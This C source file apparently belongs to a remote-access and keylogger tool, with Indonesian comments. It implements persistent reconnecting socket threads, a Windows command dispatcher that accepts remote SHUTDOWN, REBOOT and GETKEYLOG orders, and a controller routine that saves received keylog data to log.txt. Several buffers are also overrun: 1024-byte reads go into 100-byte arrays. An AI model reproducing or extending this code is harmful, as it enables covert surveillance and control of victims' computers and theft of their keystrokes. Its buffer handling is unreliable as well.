#include "socket.h"
#include "common.h"
#include "../target/command.h"

#ifdef _WIN32
#else
#include <netinet/in.h>
#include <sys/socket.h>
#include <pthread.h>
#include <string.h>
#include <arpa/inet.h>
#endif

#include <errno.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

void inisialisasiParamThread(paramThread * param){
#ifdef _WIN32
	if((param) == NULL) return;

	(param)->serverSocket = INVALID_SOCKET;
	(param)->clientSocket = INVALID_SOCKET;
	(param)->addrlen = -1;
	(param)->litAddress = NULL;
	(param)->socketStatus = '\0';
#else
	if(isEmpty(param)) return;
	(param)->serverSocket = -1;
	(param)->clientSocket = -1;
	(param)->addrlen = 0;
	(param)->litAddress = NULL;
	(param)->socketStatus = '\0';
#endif
}

void isiStatus(paramThread * param, char status){
	if(isEmpty(param)) return;
	if(status != 's' && status != 'c' && status != 'C' && status != 'S' && status != 'x' && status != 'X'){
		return;
	}else printf("ISI STATUS BERHASIL\n");

	(param)->socketStatus = status;

}

void isiPort(paramThread * param, int port){
	if(isEmpty(param)) return;

	(param)->address.sin_port = htons(port);
}

void isiAddress(paramThread * param, char * address){
	if(isEmpty(param)) return;

	(param)->litAddress = myStrdup(address);
}

// JENIS-JENIS STATUS BUAT CLIENT:
// S : awalan, gak konek ke server
// s : konek ke server
// X : coba konek atau pernah konek tapi gak lagi karena server mati
#ifdef _WIN32
DWORD WINAPI serverSocket(LPVOID paramT){
	paramThread * param = (paramThread *)paramT;

	(param)->addrlen = sizeof((param)->address);

	while(1){
		(param)->serverSocket = socket(AF_INET, SOCK_STREAM, 0);
		if ((param)->serverSocket == INVALID_SOCKET) Sleep(500);
		else break;
	}

	(param)->address.sin_family = AF_INET;
	(param)->address.sin_addr.s_addr = INADDR_ANY;

	while(1){
		if (bind((param)->serverSocket,
			(struct sockaddr *)&(param)->address,
			sizeof((param)->address)) == SOCKET_ERROR) Sleep(500);
		else break;
	}

	while(1){
		if(listen((param)->serverSocket, 3) < 0) Sleep(500);
		else break;
	}

	while(1){
		while((param)->socketStatus == 'S' || (param)->socketStatus == 'X'){
			printf("GETTING CLIENT:\n");
			(param)->clientSocket = accept((param)->serverSocket,
							(struct sockaddr *)&(param)->address,
							&(param)->addrlen);
			if ((param)->clientSocket == INVALID_SOCKET) Sleep(500);
			else (param)->socketStatus = 's';
		}
		while((param)->socketStatus == 's') Sleep(500);
	}
}
#else
void * serverSocket(void * vParam){
	int opt = 1;

	paramThread * param = (paramThread *)vParam;

	isiStatus(param, 'S');
	
	while(1){	
		while(1){
			((param)->serverSocket) = socket(AF_INET, SOCK_STREAM, 0);
			if ((param)->serverSocket < 0) usleep(500000);
			else break;

		}
		while(1){
			if(setsockopt(((param)->serverSocket), SOL_SOCKET,
					SO_REUSEADDR | SO_REUSEPORT, 
					&opt, sizeof(opt)) < 0) usleep(500000);
			else break;
		}
	
		(param)->address.sin_family = AF_INET;
		(param)->address.sin_addr.s_addr = INADDR_ANY;
		
		int flags = fcntl(((param)->serverSocket), F_GETFL, 0);         // Get current flags
									
		while(1){
			if(fcntl(((param)->serverSocket), F_SETFL, flags | O_NONBLOCK) >= 0) break;
			else usleep(500000);
		}

		while(1){
			if(bind(((param)->serverSocket),
				(struct sockaddr*)&(param->address),
				sizeof((param)->address)) < 0) usleep(500000);
			else break;
		}
	
		while(1){
			if(listen(((param)->serverSocket), 3) < 0) usleep(500000);
			else break;
		}
	
		printf("SEBELUM LOOP\n");
		while(1){
			while(param->clientSocket < 0){
				(param)->socketStatus = 'S';
				if ((param->clientSocket = accept(((param)->serverSocket), 
								(struct sockaddr*)&(param)->address, 
								&(param)->addrlen)) < 0)
				usleep(500000);
				else {(param)->socketStatus = 's'; break;}
			}
			usleep(1000000);
		}
	}

	return NULL;
}
#endif
// JENIS-JENIS STATUS BUAT CLIENT:
// C : awalan, gak konek ke server
// c : konek ke server
// x : coba konek atau pernah konek tapi gak lagi karena server mati
#ifdef _WIN32
DWORD WINAPI clientSocket(LPVOID paraM){
	paramThread * param = (paramThread *)paraM;

	while(1){
		while(1){
		(param)->clientSocket = socket(AF_INET, SOCK_STREAM, 0);
			if ((param)->clientSocket == INVALID_SOCKET) Sleep(500);
			else break;
		}
	
		(param)->address.sin_family = AF_INET;
		(param)->address.sin_addr.s_addr = inet_addr((param)->litAddress);
	
		while(1){
			if (connect((param)->clientSocket,
					(struct sockaddr *)&(param)->address,
					sizeof((param)->address)) < 0) Sleep(500);
			else break;
		}
	
		printf("CONNECTED TO SERVER\n");

		(param)->socketStatus = 'c';

		while((param)->socketStatus == 'c') {Sleep(5000);}
		printf("SEBELUM WHILE: %c\n", (param)->socketStatus);

	
		closesocket((param)->clientSocket);
	}
	return 0;
}
#else
void * clientSocket(void * vParam){
	int opt = 1;
	paramThread * param = (paramThread *)vParam;

	while(1){
		isiStatus(param, 'C');
		while(1){
			(param)->clientSocket = socket(AF_INET, SOCK_STREAM, 0);
			if((param)->clientSocket < 0) usleep(500000);
			else break;
		}
	
		while(1){
			if(setsockopt(((param)->clientSocket), SOL_SOCKET,
					SO_REUSEADDR | SO_REUSEPORT, 
					&opt, sizeof(opt)) < 0) usleep(500000);
			else break;
		}
	
		(param)->address.sin_family = AF_INET;
		(param)->address.sin_addr.s_addr = inet_addr((param)->litAddress);

		
		while(1){
			if(inet_pton(AF_INET, (param)->litAddress, &(param)->address.sin_addr) < 0 )
				usleep(500000);
			else break;
		}
	
		while(1){
			if ((param)->socketStatus == 'C'){
				if( connect((param)->clientSocket,
						(struct sockaddr*)&(param)->address, 
						sizeof((param)->address)) >= 0)
					(param)->socketStatus = 'c';
				else (param)->socketStatus = 'x';
			}
			while((param)->socketStatus == 'c') usleep(500000);
			if ((param)->socketStatus == 'x'){ close((param)->clientSocket); break;}
		}
		printf("\nKELUAR LOOP\n"); usleep(1000000);
	}
	return NULL;
}
#endif

#ifdef _WIN32
DWORD WINAPI sendMessage(LPVOID paramT){
	char buffer[100] = {0};

	paramThread * param = (paramThread *)paramT;

	while(1){
		while((param)->socketStatus == 'c' || (param)->socketStatus == 's'){
		printf("SEND:\t"); secureInputString(buffer, 1024);
		send((param)->clientSocket, buffer, strlen(buffer), 0);
		memset(buffer, 0, strlen(buffer));
		}
		Sleep(1000);
	}
	return 0;
}
#else
void * sendMessage (void * c){
	printf("INSIDE sendMessage\n");
	int * client = (int *)(c);
	char buffer[1024] = {0};

	while(1){
		if((*client) < 0){usleep(5000); continue;}
		printf("SEND:\t"); secureInputString(buffer, 1024);
		send(*client, buffer, strlen(buffer), 0);
		memset(buffer, '\0', sizeof(buffer));
	}
	return NULL;
}
#endif

#ifdef _WIN32
DWORD WINAPI getMessageController(LPVOID paramT){
	char server_reply[100] = {0};

	paramThread * param = (paramThread *)paramT;

	int recv_size = 0;

	while(1){
		while((param)->socketStatus == 'c' || (param)->socketStatus == 's'){
			recv_size = recv((param)->clientSocket, server_reply, sizeof(server_reply), 0);
			if (recv_size == 0 || recv_size == SOCKET_ERROR) {
				if((param)->socketStatus == 'c') (param)->socketStatus = 'x';
				else (param)->socketStatus = 'X';
				break;
			} else {
				server_reply[recv_size] = '\0';
				printf("Server reply: %s\n", server_reply);
				memset(server_reply, '\0', sizeof(server_reply));
			}
		}
		Sleep(1000);
	}
	return 0;
}
#else
void * getMessageController (void * vParam){
	printf("INSIDE getMessage\n");
	char buffer[1024] = {0};
	int pass = 0;

	paramThread * param = (paramThread *)vParam;

	unsigned char GETFILE = 0;

	FILE * fp;


	while(1){
		if((param)->socketStatus == 's' || (param)->socketStatus == 'c'){
		pass = read((param)->clientSocket, buffer, 1024 - 1);

		if(pass > 0){
			if(strcmp(buffer, "GETFILE") == 0) {
				GETFILE = 1; memset(buffer, '\0', sizeof(buffer));
				fp = fopen("log.txt", "w"); continue;
			} else if(strcmp(buffer, "ENDGETFILE") == 0) {
				GETFILE = 0; memset(buffer, '\0', sizeof(buffer));
				fp = NULL; continue;
			}

			if(GETFILE == 0) printf("%s\n", buffer);
			else if(GETFILE == 1) fputs(buffer, fp);

			memset(buffer, '\0', sizeof(buffer));
		}else if(pass == 0){
			if((param)->socketStatus == 's'){
				close((param)->clientSocket);
				(param)->clientSocket = -1;
			}else if((param)->socketStatus == 'c' || (param)->socketStatus == 'C'){
				(param)->socketStatus = 'x';
			}else return NULL;
		}
		}else printf("CONNECTING\n");

		usleep(1000000);
	}
	return NULL;
}
#endif

#ifdef _WIN32
DWORD WINAPI getMessage(LPVOID paramT){
	char server_reply[100] = {0};

	paramThread * param = (paramThread *)paramT;

	int recv_size = 0;

	while(1){
		while((param)->socketStatus == 'c' || (param)->socketStatus == 's'){
			recv_size = recv((param)->clientSocket, server_reply, sizeof(server_reply), 0);
			if (recv_size == 0 || recv_size == SOCKET_ERROR) {
				if((param)->socketStatus == 'c') (param)->socketStatus = 'x';
				else (param)->socketStatus = 'X';
				break;
			} else {
				server_reply[recv_size] = '\0';
				printf("Server reply: %s\n", server_reply);
				memset(server_reply, '\0', sizeof(server_reply));
			}
		}
		Sleep(1000);
	}
	return 0;
}
#else
void * getMessage (void * vParam){
	printf("INSIDE getMessage\n");
	char buffer[1024] = {0};
	int pass = 0;

	paramThread * param = (paramThread *)vParam;

	while(1){
		if((param)->socketStatus == 's' || (param)->socketStatus == 'c'){
		pass = read((param)->clientSocket, buffer, 1024 - 1);

		if(pass > 0){
			printf("\nMESSAGE:\t%s\n", buffer);
			memset(buffer, '\0', sizeof(buffer));
		}else if(pass == 0){
			if((param)->socketStatus == 's'){
				close((param)->clientSocket);
				(param)->clientSocket = -1;
			}else if((param)->socketStatus == 'c' || (param)->socketStatus == 'C'){
				(param)->socketStatus = 'x';
			}else return NULL;
		}
		}else printf("CONNECTING\n");

		usleep(1000000);
	}
	return NULL;
}
#endif

// FUNGSI UTAMA COMMAND
#ifdef _WIN32
DWORD WINAPI execMessage(LPVOID paramT){
	if (paramT == NULL) return -1;

	paramThread * param = (paramThread *)paramT;
	char server_reply[1024] = {0};
	int recv_size = 0;

	box cmd;
	inisialisasi(cmd);

	addCommand("SHUTDOWN", (void *)SHUTDOWN, cmd);
	addCommand("REBOOT", (void *)REBOOT, cmd);
	addCommand("EXIT", (void *)EXIT, cmd);
	addCommand("HALLO", (void *)HALLO, cmd);
	addCommand("GETKEYLOG", (void *)GETKEYLOG, cmd);

	while(1){
		while((param)->socketStatus == 'c' || (param)->socketStatus == 's'){
			recv_size = recv((param)->clientSocket, server_reply, sizeof(server_reply), 0);
			if (recv_size == 0 || recv_size == SOCKET_ERROR) {
				if((param)->socketStatus == 'c') (param)->socketStatus = 'x';
				else (param)->socketStatus = 'X';
				break;
			} else {
				proccess(server_reply, param, cmd);
				printf("Server reply: %s\n", server_reply);
				memset(server_reply, '\0', sizeof(server_reply));
			}
		}
		Sleep(1000);
	}

	return 0;
}
#else
#endif
